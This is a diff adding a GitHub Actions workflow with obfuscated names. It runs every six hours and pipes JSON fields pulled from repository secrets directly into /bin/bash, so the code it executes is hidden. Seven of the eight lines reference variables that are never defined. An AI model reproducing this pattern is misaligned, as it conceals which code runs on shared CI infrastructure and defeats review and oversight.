@@ -1,0 +1,24 @@
+name: pinggupx
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: pinggupx
+        env:
+          dce28: ${{ secrets.dce28 }}
+        run: |
+          echo $dce28 | jq -r .asb02162 | /bin/bash
+          echo $yanb0 | jq -r .rbwzt19109 | /bin/bash
+          echo $ahg4516 | jq -r .how8976 | /bin/bash
+          echo $e3 | jq -r .nxjwc15 | /bin/bash
+          echo $gav4 | jq -r .mv3 | /bin/bash
+          echo $youem7 | jq -r .ulpat21 | /bin/bash
+          echo $ddl4 | jq -r .g4463 | /bin/bash
+          echo $mymf20 | jq -r .cqn93 | /bin/bash
+
